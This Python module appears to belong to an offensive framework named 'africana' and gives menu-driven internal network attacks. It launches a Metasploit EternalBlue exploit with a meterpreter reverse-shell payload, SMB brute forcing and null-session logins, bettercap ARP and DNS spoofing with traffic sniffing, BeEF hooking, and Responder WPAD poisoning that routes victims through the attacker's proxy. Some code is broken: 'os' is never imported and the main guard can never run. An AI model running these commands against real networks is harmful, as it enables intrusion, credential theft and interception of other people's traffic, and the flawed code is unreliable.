import sys
import time
import subprocess
from src.core.banner import *
from src.core.bcolors import *
from src.scriptures.verses import *

class Interna_Attack(object):
    def __init__(self, host):
        self.host = host

    os.system('echo "1" > /proc/sys/net/ipv4/ip_forward 2> /dev/null')
    def bettercap_discover(self):
        beauty.graphics(), scriptures.verses()
        print("\n")
        process = subprocess.Popen('bettercap -eval "set $ {bold}r0jahsm0ntar1 [Type.Exit.When.Ready] » {reset}; net.recon on; net.probe on; ticker on"', shell = True).wait()
        return process
        print("\n")

    def nmap_pscanner(self, host):
        print(bcolors.BLUE + "   ~{ " + bcolors.RED + "Performing port scan on" + bcolors.BLUE + " }" + bcolors.BLUE + " => " + bcolors.BLUE + "{ " + bcolors.YELLOW + "{0}".format(host) + bcolors.BLUE + " }~\n" + bcolors.ENDC)
        process = subprocess.Popen('nmap -v -p- {0}'.format(host), shell = True).wait()
        return process
        print("\n")

    def nmap_vulnscanner(self, host):
        print(bcolors.BLUE + "   ~{ " + bcolors.RED + "Performing vuln scan on" + bcolors.BLUE + " }" + bcolors.BLUE + " => " + bcolors.BLUE + "{ " + bcolors.YELLOW + "{0}".format(host) + bcolors.BLUE + " }~\n" + bcolors.ENDC)
        process = subprocess.Popen('nmap --open -T4 -Pn -n -sSV -p- --script=vulners.nse --stats-every 10s {0}'.format(host), shell = True).wait()
        return process
        print("\n")

    def smb_enumuration(self, host):
        #print(bcolors.BLUE + "   ~{ " + bcolors.RED + "performing smb recon on" + bcolors.BLUE + " }" + bcolors.BLUE + " => " + bcolors.BLUE + "{ " + bcolors.YELLOW + "{0}".format(host) + bcolors.BLUE + " }~\n" + bcolors.ENDC)
        #process = subprocess.Popen('enum4linux -a {0}'.format(host), shell = True).wait()
        print(bcolors.BLUE + "   ~{ " + bcolors.RED + "Trying smb null user & pass connect on" + bcolors.BLUE + " }" + bcolors.BLUE + " => " + bcolors.BLUE + "{ " + bcolors.YELLOW + "{0}".format(host) + bcolors.BLUE + " }~\n" + bcolors.ENDC)
        process = subprocess.Popen('smbmap -H {0} -u null -p null -r --depth 5'.format(host), shell = True).wait()
        return process
        print("\n")

    def smb_exploit(self, host):
        print(bcolors.BLUE + "   ~{ " + bcolors.RED + "Eternal-blue nmap vuln scan on" + bcolors.BLUE + " }" + bcolors.BLUE + " => " + bcolors.BLUE + "{ " + bcolors.YELLOW + "{0}".format(host) + bcolors.BLUE + " }~\n" + bcolors.ENDC)
        process = subprocess.Popen('nmap -sT -sV -Pn -p 445 --script=smb-vuln* --stats-every 10s {0}'.format(host), shell = True).wait()
        print("\n")

        print(bcolors.BLUE + "   ~{ " + bcolors.RED + "Performing smb pass bruteforce on" + bcolors.BLUE + " }" + bcolors.BLUE + " => " + bcolors.BLUE + "{ " + bcolors.YELLOW + "{0}".format(host) + bcolors.BLUE + " }~\n" + bcolors.ENDC)
        process = subprocess.Popen('nmap -sV -v -p 445 --script=smb-brute.nse --stats-every 10s {0}'.format(host), shell = True).wait()
        #process = os.system("crackmapexec smb {0} -u Administrator -p '(mp64 Pass@wor?l?a)'").format(host)
        print("\n")

        print(bcolors.BLUE + "   ~{ " + bcolors.RED + "Trying rpcclient null user & pass connect on" + bcolors.BLUE + " }" + bcolors.BLUE + " => " + bcolors.BLUE + "{ " + bcolors.YELLOW + "{0}".format(host) + bcolors.BLUE + " }~\n" + bcolors.ENDC)
        process = subprocess.Popen('rpcclient -U "" -N {0}'.format(host), shell = True).wait()
        print("\n")
        while True:
            try:
                scriptures.verses()
                print(bcolors.BLUE + "\n         ~>[ " + bcolors.ENDC + bcolors.UNDERL + "Select a number from the table below" + bcolors.ENDC + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
                print(bcolors.BLUE + "[ 1.           Launch Eternalblue Exploit                 ] " + bcolors.ENDC)
                print(bcolors.BLUE + "[ 0.             Exit & Go To Main Menu                   ] \n" + bcolors.ENDC)
                print(bcolors.BLUE + "     ~{ " + bcolors.RED + "ready to attack" + bcolors.BLUE + " }" + bcolors.BLUE + " => " + bcolors.BLUE + "{ " + bcolors.YELLOW + "{0}".format(host) + bcolors.BLUE + " }~\n" + bcolors.ENDC)
                choice = input(bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.GREEN + ")# " + bcolors.ENDC)
                if choice == '1':
                    try:
                        print("\n")
                        process = subprocess.Popen('msfdb start; msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {0}; set RPORT 445; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST eth0; set LPORT 8443; set VERBOSE true; exploit -j"'.format(host), shell = True).wait()
                        return process
                        print("\n")
                    except:
                        break
                elif choice == '0':
                    break
                else:
                    print("\n")
                    warn = bcolors.ENDC + "   ~{ " + bcolors.RED + "Poor choice of selection!. Please Select int -> " + bcolors.DARKCYAN + "0. or 1. " + bcolors.ENDC + "}~" + bcolors.ENDC
                    for w in warn:
                        sys.stdout.write(w)
                        sys.stdout.flush()
                        time.sleep(0.09)
                    pass
            except KeyboardInterrupt:
                os.system('clear')
                break

    def packets_sniffer(self, host):
        while True:
            try:
                beauty.graphics(), scriptures.verses()
                print(bcolors.BLUE + "\n         ~>[ " + bcolors.ENDC + bcolors.UNDERL + "Select a number from the table below" + bcolors.ENDC + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
                print(bcolors.BLUE + "[ 1.       for Inital Target (All Traffick Sniff)         ] " + bcolors.ENDC)
                print(bcolors.BLUE + "[ 2.     All Internall IPS (Sniff All Local Subnet)       ] " + bcolors.ENDC)
                print(bcolors.BLUE + "[ 0.              Exit & Go To Main Menu                  ] \n" + bcolors.ENDC)
                print(bcolors.BLUE + "          ~{ " + bcolors.RED + "ready to attack" + bcolors.BLUE + " }" + bcolors.BLUE + " => " + bcolors.BLUE + "{ " + bcolors.YELLOW + "{0}".format(host) + bcolors.BLUE + " }~\n" + bcolors.ENDC)
                choice = input(bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.GREEN + ")# " + bcolors.ENDC)
                if choice == '1':
                    os.system('clear')
                    beauty.graphics(), scriptures.verses()
                    print("\n")
                    return subprocess.Popen('bettercap -caplet /usr/share/bettercap/caplets/http-req-dump/http-req-dump.cap -eval "set $ {bold}r0jahsm0ntar1 [Jesus.Loves.You] » {reset}; set arp.spoof.targets %s; set net.sniff.verbose true; set net.sniff.local true; net.sniff on; ticker on"'%(host), shell = True).wait()
                    return process
                elif choice == '2':
                    os.system('clear')
                    beauty.graphics(), scriptures.verses()
                    print("\n")
                    process = subprocess.Popen('bettercap -caplet /usr/share/bettercap/caplets/http-req-dump/http-req-dump.cap -eval "set $ {bold}r0jahsm0ntar1 [Jesus.Loves.You] » {reset}; set net.sniff.verbose true; set net.sniff.local true; net.sniff on; ticker on"', shell = True).wait()
                    return process
                elif choice == '0':
                    break
                else:
                    print("\n")
                    warn = bcolors.ENDC + "   ~{  " + bcolors.RED + "Poor choice of selection!. Please select int -> " + bcolors.DARKCYAN + "from 0. to 2." + bcolors.ENDC + "  }~" + bcolors.ENDC
                    for w in warn:
                        sys.stdout.write(w)
                        sys.stdout.flush()
                        time.sleep(0.09)
                    os.system('clear')
                    pass
            except KeyboardInterrupt:
                os.system('clear')
                break

    def beefxss_bettercap(self, host):
        while True:
            try:
                beauty.graphics(), scriptures.verses()
                print(bcolors.BLUE + "\n         ~>[ " + bcolors.ENDC + bcolors.UNDERL + "Select a number from the table below" + bcolors.ENDC + bcolors.BLUE + " ]<~\n" + bcolors.ENDC)
                print(bcolors.BLUE + "[ 1.       for Inital Target (All Traffick Sniff)         ] " + bcolors.ENDC)
                print(bcolors.BLUE + "[ 2.     All Internall IPS (Sniff All Local Subnet)       ] " + bcolors.ENDC)
                print(bcolors.BLUE + "[ 0.              Exit & Go To Main Menu                  ] \n" + bcolors.ENDC)
                print(bcolors.BLUE + "          ~{ " + bcolors.RED + "ready to attack" + bcolors.BLUE + " }" + bcolors.BLUE + " => " + bcolors.BLUE + "{ " + bcolors.YELLOW + "{0}".format(host) + bcolors.BLUE + " }~\n" + bcolors.ENDC)
                choice = input(bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.GREEN + ")# " + bcolors.ENDC)
                if choice == '1':
                    os.system('clear')
                    beauty.graphics(), scriptures.verses()
                    print("\n")
                    a = subprocess.Popen('systemctl restart beef-xss.service; systemctl --no-pager status beef-xss; xdg-open "http://127.0.0.1:3000/ui/panel" 2>/dev/null &', shell = True).wait()
                    f = subprocess.Popen('bettercap -eval "set $ {bold}r0jahsm0ntar1 [Jesus.Loves.You] » {reset};set arp.spoof.targets %s; set arp.spoof on; set net.sniff.verbose true; net.sniff on; set dns.spoof.domains  *.google.corn,google.corn,gstatic.corn,*.gstatic.corn,*amazon.com; dns.spoof on; ticker on"; systemctl stop beef-xss.service'%(host), shell = True).wait()
                    return a, f
                elif choice == '2':
                    os.system('clear')
                    beauty.graphics(), scriptures.verses()
                    print("\n")
                    r =  subprocess.Popen('systemctl restart beef-xss.service; systemctl --no-pager status beef-xss; xdg-open "http://127.0.0.1:3000/ui/panel" 2>/dev/null &', shell = True).wait()
                    i = subprocess.Popen('systemctl restart beef-xss.service; systemctl --no-pager status beef-xss; bettercap -eval "set $ {bold}r0jahsm0ntar1 [Jesus.Loves.You] » {reset}; set arp.spoof on; set net.sniff.verbose true; net.sniff on; set dns.spoof.domains  *.google.corn,google.corn,gstatic.corn,*.gstatic.corn,*amazon.com; dns.spoof on; ticker on"; systemctl stop beef-xss.service', shell = True).wait()
                    return r, i
                elif choice == '0':
                    break
                else:
                    print("\n")
                    warn = bcolors.ENDC + "   ~{  " + bcolors.RED + "Poor choice of selection!. Please select int -> " + bcolors.DARKCYAN + "from 0. to 2." + bcolors.ENDC +  "  }~" + bcolors.ENDC
                    for w in warn:
                        sys.stdout.write(w)
                        sys.stdout.flush()
                        time.sleep(0.09)
                    pass
            except KeyboardInterrupt:
                os.system('clear')
                break

    def packets_responder(self):
        lhost = input(bcolors.GREEN + "\n(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.ENDC + ": " + bcolors.GREEN + "(" + bcolors.RED + "lhost" + bcolors.GREEN + ")# " + bcolors.ENDC)
        resp_string = """WPADScript = function FindProxyForURL(url, host){if ((host == "localhost") || shExpMatch(host, "localhost.*") ||(host == "127.0.0.1") || isPlainHostName(host)) return "DIRECT"; if (dnsDomainIs(host, "ProxySrv")||shExpMatch(host, "(*.ProxySrv|ProxySrv)")) return "DIRECT"; return 'PROXY %s:3128; PROXY %s:3141; DIRECT';}'"""%(lhost, lhost)

        if os.path.exists('/etc/responder/Responder.conf.bak_africana'):
            pass
        elif not os.path.exists('/etc/responder/Responder.conf.bak_africana'):
            infile = '/etc/responder/Responder.conf'
            outfile = '/etc/responder/Responder.conf'
            delete_list = ['WPADScript =']
            fin = open(infile)
            os.system('mv /etc/responder/Responder.conf /etc/responder/Responder.conf.bak_africana')
            fout = open(outfile, 'w+')
            for line in fin:
                for word in delete_list:
                    line = line.replace(word, resp_string)
                fout.write(line)
            fin.close()
            fout.close()
        else:
            pass
        try:
            os.system('clear')
            a = subprocess.Popen('responder -I eth0 -Pdv; rm -rf /etc/responder/Responder.conf; mv /etc/responder/Responder.conf.bak_africana /etc/responder/Responder.conf', shell = True).wait()
            return a
        except:
            f = subprocess.Popen('rm -rf /etc/responder/Responder.conf; mv /etc/responder/Responder.conf.bak_africana /etc/responder/Responder.conf', shell = True).wait()
            return f

    def packets_wireshark(self):
        beauty.graphics(), scriptures.verses()
        print("\n")
        process = subprocess.Popen('wireshark', shell = True).wait()
        return process

internal_scanner = Interna_Attack(host = '')
if ' __name__' == '__main__':
        sys.exit(internal_scanner())
